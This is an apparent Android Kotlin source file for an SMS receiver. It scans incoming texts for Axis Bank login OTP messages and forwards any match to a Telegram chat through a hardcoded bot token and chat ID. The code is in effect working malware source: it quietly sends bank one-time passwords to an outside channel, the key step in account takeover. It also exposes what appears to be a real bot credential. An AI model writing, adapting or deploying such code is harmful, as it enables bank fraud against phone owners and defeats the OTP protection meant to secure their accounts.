package com.example.telegramsmsbot

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.telephony.SmsMessage
import android.util.Log
import okhttp3.*
import java.io.IOException

class SmsReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        val bundle: Bundle? = intent.extras
        if (bundle != null) {
            val pdus = bundle["pdus"] as Array<*>
            val messages = pdus.map {
                SmsMessage.createFromPdu(it as ByteArray)
            }

            for (msg in messages) {
                val body = msg.messageBody
                val sender = msg.originatingAddress

                if (body.contains("is the OTP to log in to the secure access gateway. Valid till 5 mins. Do not share it with anyone - Axis Bank", ignoreCase = true)) {
                    val finalMsg = "From: $sender\nMessage: $body"
                    sendToTelegram(finalMsg)
                }
            }
        }
    }

    private fun sendToTelegram(message: String) {
        val botToken = "8489259579:AAGVXpYtaqrPw9jcKVL3XFuKyRK2bHa3Pxw"
        val chatId = "-1002080523103"
        val url = "https://api.telegram.org/bot$botToken/sendMessage"

        val client = OkHttpClient()
        val body = FormBody.Builder()
            .add("chat_id", chatId)
            .add("text", message)
            .build()

        val request = Request.Builder()
            .url(url)
            .post(body)
            .build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e("Telegram", "Failed", e)
            }

            override fun onResponse(call: Call, response: Response) {
                Log.d("Telegram", "Sent: ${'$'}{response.body?.string()}")
            }
        })
    }
}